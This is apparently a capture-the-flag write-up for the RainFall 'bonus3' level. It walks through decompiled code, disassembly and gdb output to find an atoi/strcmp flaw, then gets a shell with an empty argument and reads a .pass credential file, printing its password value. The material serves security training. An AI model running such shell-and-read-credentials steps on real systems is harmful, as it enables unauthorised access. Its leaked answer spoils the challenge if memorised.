```sh
for (iVar2 = 0x21; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + (uint)bVar4 * -2 + 1;
  }
```
> set local_98(size 16) string to '\0' on 0x21 bytes

```sh
0x0804851f <+43>:	lea    0x18(%esp),%ebx
0x08048523 <+47>:	mov    $0x0,%eax
0x08048528 <+52>:	mov    $0x21,%edx
0x0804852d <+57>:	mov    %ebx,%edi
0x0804852f <+59>:	mov    %edx,%ecx
0x08048531 <+61>:	rep stos %eax,%es:(%edi)
```

So local_98 is located at $esp+0x18

```c
fread(local_98,1,0x42,local_14);//set 0x42 of &.pass in local_98 (66-16 = overflow of 50)
```

all .pass should be in local_98

```c
iVar2 = atoi(*(char **)(param_2 + 4));
*(undefined *)((int)local_98 + iVar2) = 0;//set null byte to local_98 at he given av[1]
```

```sh
./bonus3 10000000000
Segmentation fault (core dumped)
```

Seg. fault because set '\0' too far

```s
iVar2 = atoi(*(char **)(param_2 + 4));
*(undefined *)((int)local_98 + iVar2) = 0; //set null byte to local_98 at he given av[1]
[...]
iVar2 = strcmp((char *)local_98, *(char **)(param_2 + 4)); // if av[1] == local_98 exec /bin/sh
```

If I run `./bonus3 0` the strcmp should be 0 == 0 and return 0

```sh
bonus3@RainFall:~$ ./bonus3 0 | cat -e
$
```

but here we don't seg. fault

When I test that :

```c
int main(){
	char local_98[50] = "test";
	int iVar2 = atoi("0");
	printf("%d\n", iVar2);
	*(char *)((int)local_98 + iVar2) = 0;
	int test = strcmp(local_98, 0);
	printf("%d\n", test);
}
```

There is a seg fault so I don't understand something

```sh
Breakpoint 2, 0x080485df in main ()
(gdb) info registers
eax            0xffffffff       -1
ecx            0x30     48
edx            0xbffff6a8       -1073744216
ebx            0xbffff6a8       -1073744216
esp            0xbffff690       0xbffff690
ebp            0xbffff738       0xbffff738
esi            0x0      0
edi            0xbffff72c       -1073744084
eip            0x80485df        0x80485df <main+235>
eflags         0x200297 [ CF PF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

has we can see it's interpreted has 48 '0' ascii

so if we give that to our test test2.c :

```sh
hiro@WIN-6D4JHE0NA8F:~/Rainfall/bonus3/Ressources(main⚡) » ./a.out "" | cat -e
ac : 2$
ac[1] = $
```

Yes !

## Exploit

```sh
bonus3@RainFall:~$ ./bonus3 ""
$
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$
```

